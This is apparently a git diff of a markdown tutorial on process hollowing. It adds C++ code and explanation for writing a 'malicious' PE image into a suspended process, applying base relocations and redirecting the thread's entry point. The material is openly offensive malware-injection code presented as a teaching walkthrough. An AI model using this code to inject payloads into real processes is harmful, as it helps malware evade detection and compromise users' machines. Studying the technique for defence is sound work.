@@ -211,7 +211,8 @@ Now our target process is clear of sections, what we need know os to allocate sp
 
 ### Allocate and write malicious code
 
-As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory.
+First, the dos_head pointer is assigned to the DOS header of the executable file, which is the first part of the PE file and contains legacy DOS-related information. This is done by casting the base address of the loaded file in memory (EvilImage) to a PIMAGE_DOS_HEADER type. Next, the code calculates the address of the NT headers by adding the offset stored in the e_lfanew field of the DOS header to the base address of the file. This offset indicates where the NT headers begin. The NT headers contain essential information about the PE file, such as the PE signature, file header, and optional header, which includes various data directories.
+As usual, to allocate memory in the target process we use VirtualAllocEx().
 
 ```cpp
     PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
@@ -219,7 +220,7 @@ As usual, to allocate memory in the target process we use VirtualAllocEx(), so t
 
     PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
 ```
-First thing, we retrieve the DOS and NT headers from the mapped malicious file., as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
+After that we retrieve the DOS and NT headers from the mapped malicious file, as we said before, we allocate space to contain our malicious code in the memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
 
 ```
     if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
@@ -246,10 +247,9 @@ Super easy.
 It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
 The way to do this is by reconfiguring the relocation in .reloc section, dont worry if you didn't understand this, i'll make it easier, so let's get some information about .reloc section.
 
-The .reloc section in a part of PE file contains relocation information used by the windows loader when the executable is loaded into memory. This section is crucial when the executable is not loaded at its preferred base address, requiring adjustments to certain memory addresses within the code and data.
+The .reloc section in a PE file contains relocation information used by the windows loader when the executable is loaded into memory. This section is crucial when the executable is not loaded at its preferred base address, requiring adjustments to certain memory addresses within the code and data.
 
-For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes into play.
-
+For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes to play.
 
 ```cpp
         if (BaseOffset) {
@@ -308,9 +308,10 @@ For more understanding on why we need this relocation, When an executable is com
     }
 
 ```
-So we start by checking if BaseOffset is non-zero. BaseOffset represents the difference between the original base address and the new base address of the process image. If BaseOffset is zero, there's no need for relocation, so the code skips this section. but this is rarely happen.
+So to implement relocation, we start by checking if BaseOffset is non-zero. BaseOffset represents the difference between the original base address and the new base address of the process image. If BaseOffset is zero, there's no need for relocation, so the code skips this section. but this is rarely happen.
 
-So lets break the code to steps,
+I'll break the code to steps,
+
 - **Looking for .reloc section** 
 We need to grap the .reloc section to adjust adresses, so looping on the sections find the .reloc.
 Also we calculate the address of each section header using the base address of the image and the size of the headers.
@@ -322,9 +323,89 @@ for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
         continue;
     }
 ```
-- *
-### Updating Context and Resuming the Process
+- **Setting Relocation data**
+We Retrieve the base address of the relocation section (.reloc) and the size of the relocation data from the optional header of the PE file, and set the initial offset to zero. This offset will be used to navigate through the relocation data.
+```
+    DWORD RelocAddress = sec_head->PointerToRawData;
+    IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    DWORD Offset = 0;
+```
 
+- **.reloc blocks processing**
+In this part i'll talk a little bit about .reloc section architecture in order to be able to proceed.
+The architecture of the .reloc section consists of multiple relocation blocks, each starting with a BASE_RELOCATION_BLOCK structure. This structure contains two main fields: PageAddress, which specifies the base address for the relocations within the block, and BlockSize, which indicates the size of the block including the header and the relocation entries.
+Following the block header, the block contains an array of BASE_RELOCATION_ENTRY structures. Each entry represents a relocation to be performed and consists of a type field and an offset field. The type field specifies the type of relocation ( this is very important to understand ), such as adjusting a 32-bit address, and the offset field specifies the location within the 4KB page where the relocation is to be applied. The program uses these blocks and entries to update the addresses in the PE file ( malicious file ), ensuring that the code and data are correctly positioned in memory regardless of where the program is loaded.
+I think that now we can proceed.
+```
+    while (Offset < RelocData.Size) {
+        PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&EvilImage[RelocAddress + Offset];
+        printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);
+        Offset += sizeof(BASE_RELOCATION_BLOCK);
+
+        DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+        printf("%d Entries Must Be Relocated In The Current Block.\n", EntryCount);
+
+        PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&EvilImage[RelocAddress + Offset];
+```
+As we are seeing in the code, we loop to process each relocation block in the section. A block contains relocation entries and metadata as we said before.
+after that, we count the number of entries inside the current block ( EntryCount ) and then retrive the array these relocation entries ( pBlocks ).
+
+Now we need to loop throw these entries to adjust adresses.
+```
+        for (int x = 0; x < EntryCount; x++) {
+            Offset += sizeof(BASE_RELOCATION_ENTRY);
+            if (pBlocks[x].Type == 0) {
+                printf("The Type Of Base Relocation Is 0. Skipping.\n");
+                continue;
+            }
+
+            DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;
+```
+So the for loop looks for the entries that require relocation, Relocation entries with type 0 are skipped as they do not require relocation.
+
+When we hit an entries that require relocation, we calculate the address in the section that needs to be relocated ( FieldAddress ), by adding the the block adress with the offset of the entry.
+```
+#ifdef _X86_
+					// Read The Value In That Address
+					DWORD EnrtyAddress = 0;
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset, (PVOID)((DWORD)BaseAddress + FieldAddress));
+
+					// Add The Correct Offset To That Address And Write It
+					EnrtyAddress += BaseOffset;
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
+						printf("Error Writing Entry.\n");
+					}
+					#endif
+					#ifdef _WIN64
+					// Read The Value In That Address
+					DWORD64 EnrtyAddress = 0;
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset,(PVOID)((DWORD64)BaseAddress + FieldAddress));
+					
+					// Add The Correct Offset To That Address And Write It
+					EnrtyAddress += BaseOffset;
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)){
+						printf("Error Writing Entry.\n");
+					}
+					#endif
+				}
+			}
+		}
+	}
+```
+Now for both 32bit and 64bit architectures, we read the current value of the relocation entry, adjusts it by adding BaseOffset, and writes it back to the process's memory.
+
+Anddd the relocation is done. ( For it's still the hard part ).
+
+### Updating Context and Resuming the Process
+In this last part we should modify the context structure (pContext) to set the Instruction Pointer (IP) register to the entry point of the executable. This ensures that when the process is resumed, it starts executing from the correct location within the newly loaded image.
+
+Doing this for both architectures.
+- **For 32-bit (x86)**
+pContext->Eax is set to the base address of the loaded image plus the entry point offset. This effectively points the EAX register to the starting address of the executable's code.
+- **For 64-bit (x64)**
+pContext->Rcx is similarly set to the base address plus the entry point offset, but in this case, it updates the RCX register.
 ```
     #ifdef _X86_
     pContext->Eax = (DWORD)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
